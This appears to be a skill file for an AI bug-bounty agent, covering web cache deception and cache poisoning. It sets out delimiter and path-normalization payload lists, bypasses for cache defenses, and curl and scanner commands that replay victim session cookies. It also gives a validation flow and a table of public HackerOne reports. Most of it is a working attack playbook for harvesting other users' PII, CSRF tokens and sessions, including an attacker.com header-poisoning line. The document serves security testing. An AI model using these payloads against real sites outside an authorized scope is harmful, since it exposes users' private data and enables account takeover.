---
name: hunt-web-cache-deception
description: "Use this skill when fingerprint shows CDN/cache layer — Cloudflare (`cf-cache-status`, `cf-ray`), Akamai (`x-akamai-*`, `akamaighost`), Fastly (`x-served-by`, `x-cache: HIT`), Varnish (`via: varnish`, `x-varnish`), AWS CloudFront (`x-amz-cf-id`, `x-cache: Hit from cloudfront`), Azure CDN, Sucuri, StackPath, KeyCDN, or any `age:`, `x-cache:`, `x-cache-hits:` response header. Also load when target has authenticated pages mixed with static-extension caching. Only invoke if real impact potential exists — MUST demonstrate caching of sensitive data (PII, tokens, session info, CSRF) belonging to OTHER users. Cache misconfig without victim data leakage is not a bounty."
type: hunt
---

# Hunt: WEB CACHE DECEPTION (WCD)

Trick a cache into storing an authenticated user's private response under a URL the attacker can fetch unauthenticated. Pays Critical when the cached response contains PII, tokens, or session data of other users.

## Crown Jewel Targets
- `/account`, `/profile`, `/settings`, `/api/me`, `/api/user` — returns logged-in user's PII
- `/api/token`, `/csrf`, `/api/keys` — returns secrets
- Admin dashboards with user enumeration data
- Banking/financial — `/account/balance`, `/transactions`
- Health/PHI — patient portals
- Any endpoint with `Set-Cookie` or `Authorization`-derived response that gets cached

## Detection Signals
- Response headers: `cf-cache-status: HIT/MISS/DYNAMIC`, `x-cache: HIT`, `age: <n>`, `x-cache-hits: 1`, `via: 1.1 varnish`
- Static-extension whitelist in cache config (`.css`, `.js`, `.png`, `.jpg`, `.woff`, `.ico`, `.pdf`, `.txt`, `.xml`)
- Path-based cache rules (`/static/*` cached, `/api/*` bypassed)
- Mixed: authenticated app served through same CDN as static assets

## Attack Techniques

### 1. Classic static-extension trick (Omer Gil 2017)
```
GET /account/settings/anything.css HTTP/1.1
Cookie: session=victim_cookie
```
- If origin ignores the extension and returns the user's settings page
- And cache stores it because URL ends in `.css`
- Then attacker can fetch `/account/settings/anything.css` unauthenticated and read victim's data

### 2. Delimiter confusion (WCD 2.0 — Akamai 2024)
Different layers parse path delimiters differently. Cache sees `/api/me;.css` as static, origin sees `/api/me`.
```
/api/me;.css                ← semicolon path-param (JBoss, Tomcat, .NET ignore everything after ;)
/api/me!.css
/api/me%00.css
/api/me%0a.css              ← newline
/api/me%23.css              ← URL-encoded # (fragment to origin, literal to cache)
/api/me%3f.css              ← URL-encoded ?
/api/me%2f.css              ← URL-encoded / (cache decodes, origin doesn't)
/api/me%252f.css            ← double-encoded /
/api/me\..css               ← backslash (IIS/.NET ignores)
/api/me/.css                ← trailing slash + dot
```

### 3. Path normalization differential
Cache normalizes `/api/me/../foo.css` to `/api/foo.css`; origin doesn't. Or vice versa.
```
/api/../api/me/anything.css
/api/me/./.css
/api/me//.css
//api/me/x.css
```

### 4. Nginx vs origin parser confusion
Nginx with `merge_slashes off` may forward `//api//me//x.css` literally; origin collapses slashes.
```
//account//settings//x.css
/.;/account/settings/x.css   ← Java app servers strip `/.;/`
```

### 5. Cache key normalization tricks
Cache key may exclude query string; origin returns user-specific content based on query.
```
/account?nocache=1&user_id=victim    ← cache stores as /account
```
Or cache key includes only `Host` header; origin uses `X-Forwarded-Host`.

### 6. Static-resource path injection
```
/static/../account/settings           ← if cache treats /static/* as cacheable
/assets/../api/me
```

### 7. Header-based cache poisoning (related — see hunt-cache-poison for fuller treatment)
```
X-Forwarded-Host: attacker.com         ← cached response contains attacker.com links
X-Forwarded-Scheme: http               ← downgrade redirect cached
X-Original-URL: /admin
```

### 8. CDN-specific tricks

**Cloudflare**: bypasses extension cache via `Cache-Control: no-store` on origin (rule overrides), or via Worker subrequest with stale cache. Test `/cdn-cgi/` paths.

**Akamai**: defaults to caching `.css/.js/.jpg/.png/.gif/.ico/.swf/.woff/.svg`. Honors `;jsessionid=` strip. Test edge tokenization.

**Fastly / Varnish**: VCL often strips query strings on static-path patterns. Test `req.url` normalization rules.

**CloudFront**: forwards Host header by default; cache key includes query strings only when configured. Test `Origin` header echoed and cached.

## Payloads
```
# Drop into authenticated endpoint
/account
/account/anything.css
/account/anything.js
/account/anything.png
/account.css
/account/.css
/account;.css
/account!.css
/account?.css
/account#.css
/account%00.css
/account%0a.css
/account%23.css
/account%252f.css
/account/%2e%2e/account/x.css
/account//x.css
//account/x.css
/static/../account
/.well-known/../account/x.css
/api/me/x.css
/api/me;x.css
/api/me/anything.css?x=1

# Common extensions
.css .js .ico .png .jpg .jpeg .gif .svg .woff .woff2 .ttf .pdf .txt .xml .map .json
```

## Bypass Methods
| Defense | Bypass |
|---------|--------|
| Cache only on exact static extensions | Use delimiter `/x.css` after sensitive path |
| Origin checks extension and 404s | Use `;.css` (path-param) — origin strips, cache keeps |
| Vary: Cookie in cache config | Vary header sometimes only honored for HTML — try .css extension to bypass Vary |
| Cache-Control: private on origin | CDN may still cache if static-extension rule overrides |
| Cookie-based cache bypass | Strip session before request — origin still returns user data if path-normalization tricks origin into using cached session |
| Authenticated routes 302 to login | Fetch with valid session, observe what response gets cached |

## Tools
```bash
# Web Cache Vulnerability Scanner (Hackmanit)
wcvs -u https://target.com/account -p ~/payloads/wcd.txt -v -wpc 8

# Param Miner (Burp ext) — finds cache buster differential
# Burp's "HTTP Request Smuggler" plus "Web Cache Deception" tab

# Manual cache probe
curl -sI "https://target/account/foo.css" -H "Cookie: session=VICTIM" | grep -iE 'cf-cache|x-cache|age:'
# Then immediately without cookie:
curl -s "https://target/account/foo.css" | grep -i 'victim_email'

# nuclei
nuclei -u https://target -t http/misconfiguration/cache/ -t http/cves/ | grep -i cache
```

### Validation flow (3 steps — must complete all)
1. Authenticate as victim, request `/account/x.css`. Confirm response contains victim's data and `cache-status: MISS` (first hit) or stored.
2. From a different IP / no cookies, request the same URL within TTL window. Confirm `HIT` and identical victim data.
3. Demonstrate the cached object survives across multiple cache nodes (vary Host or Edge-IP to prove geographic propagation).

## Impact
- **Critical** — caches PII (email, name, address), session tokens, CSRF tokens, financial data, or admin-level data of other users
- **High** — caches authenticated user's UI state with identifying info but limited PII
- **Medium** — caches per-user data with no real identifier leak (rare to pay)
- **Not a finding** — cache stores response but contains no victim-specific data (it's the attacker's own cached page)

## Chain Potential
- WCD → cached CSRF token → CSRF without same-origin
- WCD → cached `Authorization: Bearer ...` echo → ATO
- WCD → cached `Set-Cookie` of another user → session fixation/theft
- WCD → cached admin dashboard with user list → mass enumeration
- WCD + open redirect → cache-poisoned redirect to attacker → phishing
- WCD on OAuth callback → cached `code=` → ATO of arbitrary user

## Fallback Chain
1. If `.css` extension is not cached, try `.js`, then less-common static extensions (`.txt`, `.map`, `.json`), then woff/font (often loosely cached).
2. If origin 404s on `/account/foo.css`, switch to delimiters — `/account;foo.css`, `/account%00foo.css`, `/account/%2e%2e/foo.css` — to find the cache-vs-origin parser gap.
3. If extensions are dead, test path-based cache rules (`/static/../account`) and header-based cache key differentials (`Host`, `X-Forwarded-Host`, `Origin`).
4. If WCD is hardened, pivot to classic cache poisoning via unkeyed headers (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`) — that's a separate but adjacent class. Never stop because one technique failed.

## Real-World Reports (from Community Writeups)

| Title (truncated) | Program | Bounty | Source |
|---|---|---|---|
| **DoS on PayPal via web cache poisoning** | PayPal | $9,700 | H1 #622122 |
| **Web cache poisoning → user info disclosure** | Postmates | $500 | H1 #492841 |
| Web Cache Poisoning leads to Stored XSS | Glassdoor | $0 | H1 #1424094 |
| Defacement of catalog.data.gov via cache → stored DOMXSS | GSA Bounty | $750 | H1 #303730 |
| themes.shopify.com Host header cache poisoning → DoS | Shopify | $2,900 | H1 #1096609 |
| Web Cache Poisoning → XSS and DoS | Glassdoor | $0 | H1 #1621540 |
| WCD on tradus.com → user_id enumeration | OLX | $0 | H1 #537564 |
| Web Cache Deception | Glassdoor | $0 | H1 #2265400 |
| WCD on glassdoor.com → gdtoken Disclosure | Glassdoor | $0 | H1 #1343086 |
| CSRF-tokens cached → ATO via CloudFlare WCD | Discourse | $0 | H1 #260697 |
| Web Cache Deception Attack (XSS) | Discourse | $256 | H1 #394016 |
| Shopify WCD → personal info & CSRF token leak | Shopify | $800 | H1 #1271944 |
| WCD on open.vanillaforums.com/messages/all | Vanilla | $150 | H1 #593712 |
| WCD on algolia.com → personal info leak | Algolia | $400 | H1 #1530066 |
| Web Cache poisoning → user info disclosure | Lyst | $0 | H1 #631589 |
| Web cache poisoning → CSRF token + sensitive info | Smule | $0 | H1 #504514 |
| Web Cache Poisoning on US DoD | DoD | $0 | H1 #1183263 |
| HTTP request smuggling on Basecamp 2 → web cache poison | Basecamp | $0 | H1 #919175 |
| Web cache info leakage at sbermarket.ru | Mail.ru | $400 | H1 #893353 |

**PROVEN patterns** (3+ reports): cached `/account/settings.css` style path returns authed HTML to next anonymous request (Glassdoor ×3, Shopify, Discourse, Algolia, OLX), unkeyed `Host`/`X-Forwarded-Host` header cache poisoning → XSS/DoS (PayPal, Glassdoor, Shopify themes), CSRF-token caching → ATO (Discourse, Smule, Shopify), HTTP smuggling chained into cache poison (Basecamp).

## High-Value Chains (from Reports)

1. **WCD on /account/* + .css/.jpg suffix → other-user session+PII**
   - Glassdoor (H1 #1343086, #2265400), Shopify (#1271944, $800), Algolia ($400), OLX (user_id enum) — cached authed page served by CDN to any subsequent fetcher.
2. **Cache poisoning via Host/XFH header → stored XSS for every visitor**
   - PayPal (H1 #622122, $9.7k), Glassdoor (#1424094) — unkeyed header reflected into response, cached, served XSS to all.
3. **CSRF-token caching → predict victim token → ATO**
   - Discourse (H1 #260697), Smule (#504514) — non-Cache-Control'd page cached with token, attacker harvested and replayed.
4. **HTTP request smuggling → cache poison → site-wide XSS/DoS**
   - Basecamp (H1 #919175) — smuggled request poisoned shared cache key for normal users.
5. **WCD on /messages or /api/me → mass user-data harvesting**
   - Vanilla (#593712, $150), Postmates (#492841, $500) — iterative cache fills exfiltrated many users' data sequentially.
